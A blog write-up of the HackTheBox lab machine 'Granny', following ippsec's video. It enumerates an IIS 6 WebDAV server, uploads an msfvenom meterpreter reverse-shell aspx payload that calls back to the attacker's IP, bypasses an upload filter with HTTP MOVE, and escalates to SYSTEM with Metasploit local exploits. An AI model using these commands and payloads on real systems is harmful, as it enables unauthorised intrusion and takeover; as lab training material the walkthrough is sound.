---
published: true
---
Disassembly of ippsec’s youtube video HackTheBox - granny. Windows box where OPTIONS get enumerated and used via davtest. Web filter circumvention and a focus on using metasploit to enumerate the box and exploit it.


----------

Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risks/responsibilities.*

----------

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557291965354_image.png)

This series of write-up will contain comprehensive write-ups of hackthebox machines. In an effort to sharpen reporting techniques and help solidify the understand and methodologies used during penetration testing.

## iptables block ip address
quick walkthrough on how to block an ip:
grandpas IP: 10.10.10.14 (want to block)
grannys IP: 10.10.10.15

    iptables -L #list current rules table

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557293270792_image.png)

append output rules (block traffic coming out of the box):
    iptables -A OUTPUT -d 10.10.10.14 -j DROP

*-d = destination IP*
*-j = jump to what chain we want it to*

Remove iptables rules:
    iptables --flush

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557293424427_image.png)

*as soon as the iptables changed the “Operation not permitted” occurred.*

# Enumeration
nmap scan:
    nmap -sV -sC -oA granny 10.10.10.15

(results)

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557293511032_image.png)

*Port 80 - web-server IIS version 6, webdav server as well.*

## google IIS versions

found Microsoft website that lists all versions.
Link: https://support.microsoft.com/en-ie/help/224609/how-to-obtain-versions-of-internet-information-server-iis

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557293588486_image.png)

*at this point we could be dealing with a Windows Server 2003*

## setup background enumeration
gobuster to search directories:
    ./gobuster - w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.15 -t 20

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557294431436_image.png)

(results)

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557303252027_image.png)

*nothing of to much interest.*

Nikto scan:
    nikto -host http://10.10.10.15

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557299638764_image.png)

(results)

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557303297771_image.png)

*IIS version, PUT, possibly created by front page due to the* `*vti_bin/shtml.exe*` file.

davtest -  basic webdav enumeration
    davtest -url http://10.10.10.15

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557299759933_image.png)

*this test the PUT commands and see if it can EXEC. In this situation it was able to succed with a PUT/EXEC of ‘html’ and ‘txt’.*

navigate over to the .html

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557299959232_image.png)

*verified that davtest did indeed upload a file to the webserver.*

## burp application davtest functions

setup burp to capture the davtest application:
Change the “Bind to port” to 80:

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557300135771_image.png)

Change the Request Handling, adding the target and redirect port to 80:

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557300184445_image.png)

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557300211394_image.png)

now we can use our terminal and `curl localhost` and we intercept:

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557300279991_image.png)

captured intercept:

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557300302139_image.png)

Perform davtest on “localhost”

    davtest -url http://localhost

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557300409000_image.png)

*switch over to burp (no intercept) and view the history tab change the filter to show the highest to lowest:*

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557300467184_image.png)

*all the davtest was captured.*
we can see exactly how the PUT command was sent for each of the file types and then attempted to exec.

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557300537375_image.png)

## send to repeater

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557300608079_image.png)

*created a new html file named ippsec.html and simply added “this is a test” and it is successfully created on the web-server via the 201 created.*

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557300681675_image.png)

*indeed the html page has been created.*

## msfvenom to EXEC
On the response we can see the the application is “X-Powered-By: ASP.net” meaning that we would need an “aspx” files.
List msfvenom windows payloads:
    msfvenom -l | grep windows

*we are looking for the windows/meterpreter/reverse_tcp*

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557301593752_image.png)

List formats:
    msfvenom --help-formats

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557301677126_image.png)

Create payload:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=1337 -f aspx

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557301807051_image.png)

*copy the payload and inject into our burp PUT*

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557301864999_image.png)

*aspx payload has been uploaded to target.*

## msf handler setup
    use exploit/multi/handler
    set LHOST tun0
    set LPORT 1337
    set payload windows/meterpreter/reverse_tcp
    exploit -j

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557302020666_image.png)

*Listener is now up for port 1337.* 

## upload aspx to target
change the ippsec.html to ippsec.aspx and see it it uploads.

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557302181165_image.png)

*at this point we are faced with a forbidden.*

## analyzing the OPTIONS
From the nmap scan we saw we are able to perform a few OPTIONS commands and if we test the same command nmap sent during the scan via Burp we can retrieve the same list

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557302323414_image.png)

*of interest is the MOVE command.*
google “http MOVE” TO SEE HOW TO DO THIS

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557302367074_image.png)

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557302391858_image.png)

*In the example we want to use the MOVE command and set a Destination*

# to RCE
Next, craft a new MOVE request to set a destination of “ippsec.aspx” to circumvent the filter.

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557302624510_image.png)

*creates 204 No Content but does show that it is functional.*
checking if file exists: 

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557302675876_image.png)

*looks like the MOVE command worked and created the “.aspx”*

## metasploit response

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557302751038_image.png)

*have successfuly captured a reverse tcp shell.*
Interact with shell to figure out user level
    sessions -i 1
    shell
    whoami

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557303076871_image.png)

*background with ctrl+z*

## enumerate windows
First, search for suggester
    search suggester

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557302866620_image.png)

    use post/multi/recon/local_exploit_suggester
    set SESSION 1
    run

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557303379060_image.png)

*attempt the exploit of the ms16-016 webdav*
    use exploit/windows/local/ms16_016_webdav
    show options
    set SESSION 1
    set LHOST tun0
    run

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557303592177_image.png)

*we see the TCP handler on a localip that why he does tun0 twice*

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557303666397_image.png)

*and after re ran with the correct interface we have a successful privesc. It says to us “getuid” to see our level but in the int rum moving to another exploit ms15_0511_client_copy_image* 
    user exploit/windows/local/ms15_051_client_copy_image
    set LHOST tun0
    set LHOST tun0
    set SESSION 1
    run

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557304625128_image.png)

*error occured and didn’t seem like the exploit attached to the session correctly.*

# Root&Loot
attempt different exploit “ms14_070_tcpip_ioctrl”
    use exploit/windows/local/ms14_070_tcpip_ioctl
    set SESSION 1
    set LHOST tun0
    set LHOST tun0
    run

![](https://paper-attachments.dropbox.com/s_BBEBF86C37351892826D68F25743BDBE3366E0493B005B009C8DF7423AA48717_1557304781766_image.png)

achieved NT AUTHORITY\SYSTEM

#HAILippsec

----------

If you don’t know who ippsec is check him out at:

Youtube: https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA 
Twitter: https://twitter.com/ippsec
